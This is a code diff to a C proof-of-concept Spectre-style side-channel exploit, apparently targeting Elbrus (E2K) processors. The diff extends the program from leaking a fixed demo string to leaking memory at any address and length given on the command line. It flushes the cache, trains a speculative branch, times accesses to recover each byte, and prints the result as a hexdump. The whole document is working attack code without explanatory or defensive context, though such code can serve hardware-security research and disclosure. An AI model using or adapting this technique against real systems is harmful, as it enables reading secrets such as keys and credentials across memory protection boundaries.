@@ -16,65 +16,102 @@
     ret; \
 })
 
-uint8_t *map;
-uint8_t stub[256]; // helper for time atack
+static char secret[] = "Hello OpenE2K";
 
-void spectre_sw_impl(bool **c, uint8_t *map, const uint8_t *p, size_t i) {
+static uint8_t *map;
+
+void spectre_sw_impl(bool **c, uint8_t *map, size_t i) {
     // NOTE: condition is always false
     if (**c) {
         // NOTE: You might think that this block will never be executed, but you are wrong!
         // (only the last store instruction will not be executed)
-        map[(size_t) p[i] * CACHE_LINE_SIZE]++;
+        map[(size_t) map[i] * CACHE_LINE_SIZE]++;
     }
 }
 
 // prevents from inlining
-void (*spectre_sw)(bool **c, uint8_t *map, const uint8_t *p, size_t i) = &spectre_sw_impl;
+void (*spectre_sw)(bool **c, uint8_t *map, size_t i) = &spectre_sw_impl;
 
-static inline void cache_flush(void *p, size_t l) {
+static inline void cache_flush(const void *p, size_t l) {
     for (size_t i = 0; i < l; i += CACHE_LINE_SIZE) {
-      __builtin_storemas_64u(0, &(p[i]), 0xf, 2);
+      __builtin_storemas_64u(0, (void*) p + i, 0xf, 2);
     }
 }
 
-static uint64_t find(const uint8_t *map) {
+static int64_t find(const uint8_t *map) {
     uint64_t min = UINT64_MAX;
     uint8_t value = 0;
     uint64_t acc = 0;
     for (int i = 0; i < 256; ++i) {
         uint64_t time = clk();
-        acc += stub[map[i * CACHE_LINE_SIZE]];
+        acc += map[map[i * CACHE_LINE_SIZE]];
         time = clk() - time;
-        if (time < min) {
-            min = time;
-            value = i;
-        }
+        value = time < min ? i : value;
+        min = time < min ? time : min;
     }
-    return (acc << 8) | value;
+    acc = (acc << 8) | value;
+    return min > 32 ? -acc : acc;
+}
+
+static int get_byte(uintptr_t target) {
+    bool always_false = false, *c1 = &always_false, **cond = &c1;
+    cache_flush(map, MAP_SIZE);
+    // warmup page cache
+    for (int i = 0; i < 10; ++i)
+        spectre_sw(cond, map, target - (uintptr_t) map);
+    return find(map);
 }
 
 int main(int argc, char *argv[]) {
-    bool always_false = false, *c1 = &always_false, **cond = &c1;
-    const void *secret = argc > 1 ? argv[1] : "Hello OpenE2K";
+    uintptr_t target = (uintptr_t) secret;
     size_t secret_len = strlen(secret);
-    uint8_t c;
+    size_t len = argc > 2 ? strtoul(argv[2], NULL, 10) : secret_len;
 
-    memset(stub, 1, sizeof(stub));
+    if (argc > 1) {
+        const char *s = argv[1];
+        if (s[0] == '0' && s[1] == 'x')
+            s += 2;
+        target = strtoul(s, NULL, 16);
+    }
+
     map = aligned_alloc(CACHE_LINE_SIZE, MAP_SIZE);
     memset(map, 0, MAP_SIZE);
 
-    for (size_t i = 0; i < secret_len; ++i) {
-        cache_flush(map, MAP_SIZE);
-        spectre_sw(cond, map, secret, i);
-        c = find(map);
-        if (isprint(c)) {
-            putchar(c);
-        } else {
-            printf("\\\\x%02x", c);
-        }
-    }
+    printf("usage: %s 0x%lx %lu\n", argv[0], target, len);
     putchar('\n');
-    free(map);
+    printf("secret address: %p\n", secret);
+    printf("secret len: %lu\n", secret_len);
+    printf("secret data: \"%s\"\n", secret);
+    putchar('\n');
+    printf("target address: 0x%lx\n", target);
+    printf("target len: %lu\n", len);
+    printf("target data:\n\n");
 
+#define WIDTH 16
+    for (size_t i = 0; i < len; i += WIDTH) {
+        int16_t buffer[WIDTH];
+        for (size_t j = 0; j < WIDTH; ++j) {
+            buffer[j] = get_byte((uintptr_t) target + i + j);
+        }
+        printf("%016lx |", target + i);
+        for (size_t j = 0; j < WIDTH; ++j) {
+            if (buffer[j] >= 0) {
+                printf(" %02x", (uint8_t) buffer[j]);
+            } else {
+                printf(" ..");
+            }
+        }
+        printf(" | ");
+        for (size_t j = 0; j < WIDTH; ++j) {
+            if (buffer[j] >= 0 && isprint(buffer[j])) {
+                printf("%c", (uint8_t) buffer[j]);
+            } else {
+                printf(".");
+            }
+        }
+        printf("\n");
+    }
+
+    free(map);
     return EXIT_SUCCESS;
 }
